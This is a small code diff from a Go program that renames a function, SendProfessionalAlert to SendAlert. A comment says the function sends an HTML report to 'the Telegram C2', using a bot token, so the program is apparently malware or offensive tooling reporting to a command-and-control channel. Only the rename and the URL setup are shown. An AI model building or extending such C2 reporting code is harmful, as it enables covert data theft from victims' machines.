@@ -24,8 +24,8 @@ type AlertData struct {
 	Details   string
 }
 
-// SendProfessionalAlert sends a highly structured HTML report to the Telegram C2.
-func SendProfessionalAlert(data AlertData) error {
+// SendAlert sends a highly structured HTML report to the Telegram C2.
+func SendAlert(data AlertData) error {
 	apiURL := fmt.Sprintf(TelegramAPIURL, DefaultBotToken)
 
 	report := fmt.Sprintf(
